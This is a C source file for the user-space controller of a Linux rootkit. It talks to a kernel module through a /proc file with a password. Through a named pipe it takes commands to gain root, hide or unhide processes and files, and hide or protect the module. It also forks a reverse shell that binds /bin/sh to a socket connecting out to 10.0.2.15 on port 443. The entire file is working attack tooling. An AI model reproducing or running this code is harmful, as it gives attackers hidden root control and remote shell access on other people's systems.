/*
 * Copyright (C) 2016-2017 Arian Suarez
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <getopt.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "config.h"

#define MAX_BUF 1024
#define MAX_LINE 256

#define ACTIVE 1
#define INACTIVE 0

#define REVERSE_IP "10.0.2.15"
#define REVERSE_PORT 443

/*  check for internet connection */
int check_connection(void);

int start_reverse_shell(char *ip, unsigned int port);

/*  Get number of words from pipe  */
int word_count(char *s);

/*  Read string from pipe */
void read_from_pipe(char *pipe_name, char *pipe_buf);

/*  Fill write buffer */
void write_buffer(char **dest_ptr, char *src, size_t size);

/*  Separate options from packet */
void parse_input(char *pkt, char **arg1, char **arg2);

/*  Send action to LKM */
void action(int root, int hide_pid,
            int unhide_pid, char *pid, int hide_file,
            int unhide_file, char *file, int hide,
            int unhide, int protect, int unprotect);

int main(int argc, char **argv)
{

    /* check for internet connection */
    int online = check_connection();

    if(!online){
        return 1;
    }

    char *pipe_name = "/tmp/grape_fifo";
    char pipe_buf[MAX_BUF];
    char *arg1 = malloc(32);
    char *arg2 = malloc(256);

    /* create pipe */
    mkfifo(pipe_name, 0666);

    /*  Become root process */
    action(ACTIVE,  INACTIVE,
            INACTIVE, NULL, INACTIVE,
            INACTIVE, NULL, INACTIVE,
            INACTIVE, INACTIVE, INACTIVE);


    /*  start reverse shell to default location */
    start_reverse_shell(REVERSE_IP, REVERSE_PORT);

    while(1){
        /*  read from pipe, while loop till pipe has args */
        read_from_pipe(pipe_name, pipe_buf);
        printf("received %s\n", pipe_buf);

        /*  parse input for arguments */
        parse_input(pipe_buf, &arg1, &arg2);

        printf("Arg1: %s, len: %d\n", arg1, (int)strlen(arg1));
        printf("Arg2: %s, len: %d\n", arg2, (int)strlen(arg2));

        if (strcmp(arg1, "root") == 0){
            action(ACTIVE,  INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    INACTIVE, INACTIVE, INACTIVE);
        }
        if (strcmp(arg1, "touch") == 0){
            printf("touching\n");
            mkfifo("/opt/test", 0666);
        }
        if (strcmp(arg1, "hpid") == 0){
            printf("hpid\n");
            action(INACTIVE,  ACTIVE,
                    INACTIVE, arg2, INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    INACTIVE, INACTIVE, INACTIVE);
        }
        if (strcmp(arg1, "unpid") == 0){
            printf("unpid\n");
            action(INACTIVE,  INACTIVE,
                    ACTIVE, arg2, INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    INACTIVE, INACTIVE, INACTIVE);
        }
        if (strcmp(arg1, "hfile") == 0){
            printf("hfile\n");
            action(INACTIVE,  INACTIVE,
                    INACTIVE, NULL, ACTIVE,
                    INACTIVE, arg2, INACTIVE,
                    INACTIVE, INACTIVE, INACTIVE);
        }
        if (strcmp(arg1, "unfile") == 0){
            printf("unfile\n");
            action(INACTIVE,  INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    ACTIVE, arg2, INACTIVE,
                    INACTIVE, INACTIVE, INACTIVE);
        }
        if (strcmp(arg1, "hide") == 0){
            printf("hide\n");
            action(INACTIVE,  INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    INACTIVE, NULL, ACTIVE,
                    INACTIVE, INACTIVE, INACTIVE);
        }
        if (strcmp(arg1, "unhide") == 0){
            printf("unhide\n");
            action(INACTIVE,  INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    ACTIVE, INACTIVE, INACTIVE);
        }
        if (strcmp(arg1, "protect") == 0){
            printf("protect\n");
            action(INACTIVE,  INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    INACTIVE, ACTIVE, INACTIVE);
        }
        if (strcmp(arg1, "unprotect") == 0){
            printf("unprotect\n");
            action(INACTIVE,  INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    INACTIVE, NULL, INACTIVE,
                    INACTIVE, INACTIVE, ACTIVE);
        }
        if (strcmp(arg1, "reverse") == 0){
            printf("reverse\n");
            start_reverse_shell(arg2, REVERSE_PORT);
        }

    }

    return 0;
}

void action(int root, int hide_pid,
            int unhide_pid, char *pid, int hide_file,
            int unhide_file, char *file, int hide,
            int unhide, int protect, int unprotect){

    size_t buf_size = 0;

    buf_size += sizeof(CFG_PASS);

    if (root) {
        printf("root\n");
        buf_size += sizeof(CFG_ROOT);
    } else if (hide_pid) {
        buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
    } else if (unhide_pid) {
        buf_size += sizeof(CFG_UNHIDE_PID) + strlen(pid);
    } else if (hide_file) {
        buf_size += sizeof(CFG_HIDE_FILE) + strlen(file);
    } else if (unhide_file) {
        buf_size += sizeof(CFG_UNHIDE_FILE) + strlen(file);
    } else if (hide) {
        buf_size += sizeof(CFG_HIDE);
    } else if (unhide) {
        buf_size += sizeof(CFG_UNHIDE);
    } else if (protect) {
        buf_size += sizeof(CFG_PROTECT);
    } else if (unprotect) {
        buf_size += sizeof(CFG_UNPROTECT);
    }

    buf_size += 1; // for null terminator

    char *buf = malloc(buf_size);
    buf[buf_size - 1] = 0;

    char *buf_ptr = buf;

    write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));

    if (root) {
        write_buffer(&buf_ptr, CFG_ROOT, sizeof(CFG_ROOT));
    } else if (hide_pid) {
        write_buffer(&buf_ptr, CFG_HIDE_PID, sizeof(CFG_HIDE_PID));
        write_buffer(&buf_ptr, pid, strlen(pid));
    } else if (unhide_pid) {
        write_buffer(&buf_ptr, CFG_UNHIDE_PID, sizeof(CFG_UNHIDE_PID));
        write_buffer(&buf_ptr, pid, strlen(pid));
    } else if (hide_file) {
        write_buffer(&buf_ptr, CFG_HIDE_FILE, sizeof(CFG_HIDE_FILE));
        write_buffer(&buf_ptr, file, strlen(file));
    } else if (unhide_file) {
        write_buffer(&buf_ptr, CFG_UNHIDE_FILE, sizeof(CFG_UNHIDE_FILE));
        write_buffer(&buf_ptr, file, strlen(file));
    } else if (hide) {
        write_buffer(&buf_ptr, CFG_HIDE, sizeof(CFG_HIDE));
    } else if (unhide) {
        write_buffer(&buf_ptr, CFG_UNHIDE, sizeof(CFG_UNHIDE));
    } else if (protect) {
        write_buffer(&buf_ptr, CFG_PROTECT, sizeof(CFG_PROTECT));
    } else if (unprotect) {
        write_buffer(&buf_ptr, CFG_UNPROTECT, sizeof(CFG_UNPROTECT));
    }

    int fd = open("/proc/" CFG_PROC_FILE, O_RDONLY);

    if (fd < 1) {
        int fd = open("/proc/" CFG_PROC_FILE, O_WRONLY);

        if (fd < 1) {
            fprintf(stderr, "Error: Failed to open %s\n", "/proc/" CFG_PROC_FILE);
            printf("Error: Failed to open %s\n", "/proc/" CFG_PROC_FILE);
            exit(1);
        }

        write(fd, buf, buf_size);
    } else {
        read(fd, buf, buf_size);
    }

    close(fd);
    free(buf);

    if (root) {
        setuid(0);
    }
}

void write_buffer(char **dest_ptr, char *src, size_t size){
    memcpy(*dest_ptr, src, size);
    *dest_ptr += size;
}

int word_count(char *s){
    int i;
    int count = 1;

    for (i = 0;s[i] != '\0';i++){
        if (s[i] == ' ')
            count++;
    }

    return count;
}

void parse_input(char *pkt, char **arg1, char **arg2){

    int count = word_count(pkt);

    if(count > 1){
        *arg1 = strtok(pkt, " ");
        *arg2 = strtok(NULL, " ");
    }
    else {
        *arg1 = strtok(pkt, " ");
    }

}

void read_from_pipe(char *pipe_name, char *pipe_buf){

    /*  Clear buffer */
    memset(&pipe_buf[0], 0, sizeof(pipe_buf));

    int pipe_fd = open(pipe_name, O_RDONLY);
    read(pipe_fd, pipe_buf, MAX_BUF);
    close(pipe_fd);
}

int check_connection(void) {
    int sockfd,val;
    char buffer[MAX_LINE];
    struct hostent *google_ent=NULL;
    struct sockaddr_in google_addr;

    sockfd = -1;

    if((google_ent = gethostbyname("www.google.com")) != NULL)
    {
        if((sockfd =    socket(google_ent->h_addrtype,SOCK_STREAM,IPPROTO_TCP)) != -1)
        {
            val = 1;
            if(setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR, (char *) &val, sizeof(val)) == 0 && setsockopt(sockfd,IPPROTO_TCP,TCP_NODELAY, (char *) &val, sizeof(val)) == 0)
            {
                google_addr.sin_family = google_ent->h_addrtype;
                memcpy(&(google_addr.sin_addr), google_ent->h_addr, google_ent->h_length);
                google_addr.sin_port = htons(80);
                if( connect(sockfd,(struct sockaddr *) &google_addr,sizeof(google_addr)) == 0)
                {
                    if(write(sockfd,"GET /index.html HTTP/1.1\r\n\r\n", 29) >= 28)
                    {
                        shutdown(sockfd, SHUT_WR);
                        if(read(sockfd, buffer, MAX_LINE) != -1) // all right!
                        {
                            close(sockfd);
                            return 1;
                        }
                        else
                            printf("read() error\n");
                    }
                    else
                        printf("write() error\n");
                }
                else
                    printf("connect() error\n");
            }
            else
                printf("setsockopt() error\n");
        }
        else
            printf("socket() error\n");
    }
    else
        printf("cannot resolve IP for mom Google. \n"); // this is is the most common error.

    if(sockfd!=-1)
        close(sockfd);
    return 0; // no internet

}

int start_reverse_shell(char *ip, unsigned int port){

    struct sockaddr_in sa;
    int s;

    int pid = fork();

    if ( pid == 0 ){

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr("10.0.2.15");
        sa.sin_port = htons(443);

        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *)&sa, sizeof(sa));
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);

        printf("reverse shell process\n");
        execve("/bin/sh", 0, 0);
        return 0;
    }
    else {
        return 1;
    }
}
